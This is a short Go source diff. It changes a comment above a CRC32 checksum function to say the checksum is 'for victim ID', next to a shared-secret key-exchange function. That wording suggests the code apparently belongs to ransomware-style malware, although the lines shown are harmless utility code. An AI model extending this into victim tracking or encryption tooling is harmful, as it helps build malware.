@@ -52,7 +52,7 @@ func generateSharedSecret(myPrivateKey [32]byte, theirPublicKey [32]byte) []byte
 // fmt.Println("Shared secret 1: ", sharedSecret1)
 // fmt.Println("Shared secret 2: ", sharedSecret2)
 
-// CRC32 generating checksum
+// CRC32 generating checksum for victim ID
 func crc32Checksum(input []byte, polynomial uint32) uint32 {
 	crc32q := crc32.MakeTable(polynomial)
 	return crc32.Checksum(input, crc32q)
